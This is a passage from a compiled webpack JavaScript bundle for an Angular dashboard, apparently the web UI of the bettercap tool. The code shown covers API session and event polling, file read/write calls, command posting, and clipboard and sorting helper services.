                _this.session = session;
            });
        }
        else {
            this.session = null;
            this.creds.valid = false;
            this.onLoggedOut.emit(null);
        }
    };
    // remove settings and user credentials from the local storage
    ApiService.prototype.clearStorage = function () {
        console.log("api.clearStorage()");
        localStorage.removeItem('auth');
        this.creds.clear();
    };
    // save settings and user credentials to the local storage
    ApiService.prototype.saveStorage = function () {
        this.creds.save();
        this.settings.save();
    };
    // handler for /api/events response
    ApiService.prototype.eventsNew = function (response) {
        if (this.paused == false) {
            this.events = response;
            this.onNewEvents.emit(response);
        }
        return response;
    };
    // handler for /api/events error
    ApiService.prototype.eventsError = function (error) {
        // if /api/events fails, most likely /api/session is failing
        // as well, either due to wrong credentials or to the API not
        // being reachable - let the main session request fail and 
        // set the error state, this one will just fail silently
        // and return the cached events.
        return this.cachedEvents;
    };
    // GET /api/events and return an observable list of events
    ApiService.prototype.getEvents = function () {
        var _this = this;
        if (this.isPaused())
            return this.cachedEvents;
        var from = this.eventsFrom;
        if (from != '') {
            this.eventsFrom = '';
        }
        return this.http
            .get(this.settings.URL() + '/events', {
            headers: this.creds.headers,
            params: { 'from': from, 'n': String(this.settings.events) }
        })
            .map(function (response) { return _this.eventsNew(response); })
            .catch(function (error) { return _this.eventsError(error); });
    };
    // DELETE /api/events and clear events
    ApiService.prototype.clearEvents = function () {
        var _this = this;
        console.log("clearing events");
        this.http
            .delete(this.settings.URL() + '/events', { headers: this.creds.headers })
            .subscribe(function (response) { return _this.eventsNew([]); });
    };
    // set the credentials as valid after a succesfull session request,
    // if the user was logged out, it'll emit the onLoggedIn event
    ApiService.prototype.setLoggedIn = function () {
        var wasLogged = this.creds.valid;
        this.creds.valid = true;
        this.saveStorage();
        // if the user wasn't logged, broadcast the logged in event
        if (wasLogged == false) {
            console.log("loggedin.emit");
            this.onLoggedIn.emit();
        }
        return wasLogged;
    };
    // handler for /api/session error
    ApiService.prototype.sessionError = function (error) {
        this.ping = 0;
        // handle bad credentials and general errors separately
        if (error.status == 401) {
            this.logout();
            console.log("loggedout.emit");
            this.onLoggedOut.emit(error);
        }
        else {
            this.error = error;
            console.log("error.emit");
            this.onSessionError.emit(error);
        }
        // return an observable to the last cached object
        return this.cachedSession;
    };
    // handler for /api/session response
    ApiService.prototype.sessionNew = function (start, response) {
        var wasError = this.error != null;
        this.ping = new Date().getTime() - start.getTime();
        this.error = null;
        // if in prod, make sure we're talking to a compatible API version
        if (compare_versions__WEBPACK_IMPORTED_MODULE_3___default()(response.version, _environments_environment__WEBPACK_IMPORTED_MODULE_9__["environment"].requires) == -1) {
            if (_environments_environment__WEBPACK_IMPORTED_MODULE_9__["environment"].production) {
                this.logout();
                this.onLoggedOut.emit({
                    status: 666,
                    error: "This client requires at least API v" + _environments_environment__WEBPACK_IMPORTED_MODULE_9__["environment"].requires +
                        " but " + this.settings.URL() + " is at v" + response.version
                });
                return response;
            }
        }
        // save credentials and emit logged in event if needed
        var wasLogged = this.setLoggedIn();
        // update the session object instance
        this.session = response;
        var muted = this.module('events.stream').state.ignoring.sort();
        // if we just logged in and the user has muted events in his
        // preferences that are not in the API ignore list, we need to
        // restore them
        if (wasError == true || wasLogged == false) {
            var toRestore = this.settings.muted.filter(function (e) { return !muted.includes(e); });
            if (toRestore.length) {
                console.log("restoring muted events:", toRestore);
                for (var i = 0; i < toRestore.length; i++) {
                    this.cmd("events.ignore " + toRestore[i]);
                }
            }
        }
        // update muted events
        this.settings.muted = muted;
        // inform all subscribers that new data is available
        this.onNewData.emit(response);
        return response;
    };
    ApiService.prototype.isPaused = function () {
        // pause ui updates if:
        //
        // the user excplicitly pressed the paused button
        return this.paused ||
            // an action button is hovered (https://stackoverflow.com/questions/8981463/detect-if-hovering-over-element-with-jquery)
            $('.btn-action').filter(function () { return $(this).is(":hover"); }).length > 0 ||
            // a dropdown is open
            $('.menu-dropdown').is(':visible');
    };
    // GET /api/session and return an observable Session
    ApiService.prototype.getSession = function () {
        var _this = this;
        if (this.isPaused())
            return this.cachedSession;
        var from = this.sessionFrom;
        if (from != '') {
            this.sessionFrom = '';
        }
        var start = new Date();
        return this.http
            .get(this.settings.URL() + '/session', {
            headers: this.creds.headers,
            params: { 'from': from }
        })
            .map(function (response) { return _this.sessionNew(start, response); })
            .catch(function (error) { return _this.sessionError(error); });
    };
    // GET /api/file given its name
    ApiService.prototype.readFile = function (name) {
        console.log("readFile " + name);
        return this.http.get(this.settings.URL() + '/file', {
            headers: this.creds.headers,
            responseType: 'text',
            params: { 'name': name }
        });
    };
    // POST /api/file given its name and new contents
    ApiService.prototype.writeFile = function (name, data) {
        console.log("writeFile " + name + " " + data.length + "b");
        this.paused = false;
        return this.http.post(this.settings.URL() + '/file', new Blob([data]), {
            headers: this.creds.headers,
            params: { 'name': name }
        });
    };
    // POST /api/session to execute a command, can be asynchronous and
    // just broadcast errors via the event emitter, or synchronous and 
    // return a subscribable response
    ApiService.prototype.cmd = function (cmd, sync) {
        var _this = this;
        if (sync === void 0) { sync = false; }
        this.paused = false;
        if (sync) {
            console.log("cmd: " + cmd);
            return this.http.post(this.settings.URL() + '/session', { cmd: cmd }, { headers: this.creds.headers });
        }
        return this.cmd(cmd, true)
            .subscribe(function (val) { }, function (error) { _this.onCommandError.emit(error); }, function () { });
    };
    ApiService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
            providedIn: 'root'
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpClient"]])
    ], ApiService);
    return ApiService;
}());



/***/ }),

/***/ "./src/app/services/clipboard.service.ts":
/*!***********************************************!*\
  !*** ./src/app/services/clipboard.service.ts ***!
  \***********************************************/
/*! exports provided: ClipboardService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ClipboardService", function() { return ClipboardService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var ClipboardService = /** @class */ (function () {
    function ClipboardService() {
    }
    // taken from https://stackoverflow.com/questions/400212/how-do-i-copy-to-the-clipboard-in-javascript/30810322
    ClipboardService.prototype.copy = function (text) {
        var textArea = document.createElement("textarea");
        var range = document.createRange();
        textArea.style.position = 'fixed';
        textArea.style.top = '0';
        textArea.style.left = '0';
        // Ensure it has a small width and height. Setting to 1px / 1em
        // doesn't work as this gives a negative w/h on some browsers.
        textArea.style.width = '2em';
        textArea.style.height = '2em';
        // We don't need padding, reducing the size if it does flash render.
        textArea.style.padding = '0';
        // Clean up any borders.
        textArea.style.border = 'none';
        textArea.style.outline = 'none';
        textArea.style.boxShadow = 'none';
        // Avoid flash of white box if rendered for any reason.
        textArea.style.background = 'transparent';
        textArea.value = text;
        textArea.readOnly = false;
        textArea.contentEditable = 'true';
        document.body.appendChild(textArea);
        textArea.select();
        range.selectNodeContents(textArea);
        var s = window.getSelection();
        s.removeAllRanges();
        s.addRange(range);
        textArea.setSelectionRange(0, 999999);
        try {
            var ok = document.execCommand('copy');
            if (!ok) {
                console.log('Copying text command failed');
            }
        }
        catch (err) {
            console.log('Oops, unable to copy', err);
        }
        document.body.removeChild(textArea);
    };
    ClipboardService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
            providedIn: 'root'
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [])
    ], ClipboardService);
    return ClipboardService;
}());



/***/ }),

/***/ "./src/app/services/omnibar.service.ts":
/*!*********************************************!*\
  !*** ./src/app/services/omnibar.service.ts ***!
  \*********************************************/
/*! exports provided: OmniBarService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "OmniBarService", function() { return OmniBarService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var OmniBarService = /** @class */ (function () {
    function OmniBarService() {
        this.query = '';
    }
    OmniBarService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
            providedIn: 'root'
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [])
    ], OmniBarService);
    return OmniBarService;
}());



/***/ }),

/***/ "./src/app/services/sort.service.ts":
/*!******************************************!*\
  !*** ./src/app/services/sort.service.ts ***!
  \******************************************/
/*! exports provided: SortService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "SortService", function() { return SortService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var SortService = /** @class */ (function () {
    function SortService() {
        this.onSort = new _angular_core__WEBPACK_IMPORTED_MODULE_1__["EventEmitter"]();
    }
    SortService.prototype.emitSort = function (event) {
        this.onSort.emit(event);
    };
    SortService.prototype.sort = function (array, how) {
        // console.log("sorting " + array.length + " elements", how);
        var less = 1;
        var greater = -1;
        if (how.direction == 'desc') {
            less = -1;
            greater = 1;
        }
        if (how.type == 'ip') {
            array.sort(function (a, b) {
                a = a[how.field].split('.');
                b = b[how.field].split('.');
                for (var i = 0; i < a.length; i++) {
                    if ((a[i] = parseInt(a[i])) < (b[i] = parseInt(b[i])))
                        return less;
                    else if (a[i] > b[i])
                        return greater;
                }
                return 0;
            });
        }
        else {
            array.sort(function (a, b) { return a[how.field] < b[how.field] ? less : a[how.field] > b[how.field] ? greater : 0; });
        }
    };
    SortService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
            providedIn: 'root'
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [])
    ], SortService);
    return SortService;
}());



/***/ }),

/***/ "./src/environments/environment.ts":
/*!*****************************************!*\
  !*** ./src/environments/environment.ts ***!
  \*****************************************/
/*! exports provided: environment */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "environment", function() { return environment; });
/* harmony import */ var _package_json__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../../package.json */ "./package.json");
var _package_json__WEBPACK_IMPORTED_MODULE_0___namespace = /*#__PURE__*/__webpack_require__.t(/*! ../../package.json */ "./package.json", 1);
// This file can be replaced during build by using the `fileReplacements` array.
// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.
// The list of file replacements can be found in `angular.json`.

var environment = {
    production: false,
    name: _package_json__WEBPACK_IMPORTED_MODULE_0__.name,
    version: _package_json__WEBPACK_IMPORTED_MODULE_0__.version,
    requires: _package_json__WEBPACK_IMPORTED_MODULE_0__.requires
};
/*
 * For easier debugging in development mode, you can import the following file
 * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.
 *
 * This import should be commented out in production mode because it will have a negative impact
 * on performance if an error is thrown.
 */
// import 'zone.js/dist/zone-error';  // Included with Angular CLI.


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser-dynamic */ "./node_modules/@angular/platform-browser-dynamic/fesm5/platform-browser-dynamic.js");
/* harmony import */ var _app_app_module__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./app/app.module */ "./src/app/app.module.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./environments/environment */ "./src/environments/environment.ts");




if (_environments_environment__WEBPACK_IMPORTED_MODULE_3__["environment"].production) {
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["enableProdMode"])();
}
Object(_angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__["platformBrowserDynamic"])().bootstrapModule(_app_app_module__WEBPACK_IMPORTED_MODULE_2__["AppModule"])
    .catch(function (err) { return console.error(err); });


/***/ }),

/***/ 0:
/*!***************************!*\
  !*** multi ./src/main.ts ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! /Users/evilsocket/Bahamut/Lab/bettercap/ui/src/main.ts */"./src/main.ts");


/***/ })

},[[0,"runtime","vendor"]]]);
//# sourceMappingURL=main.js.map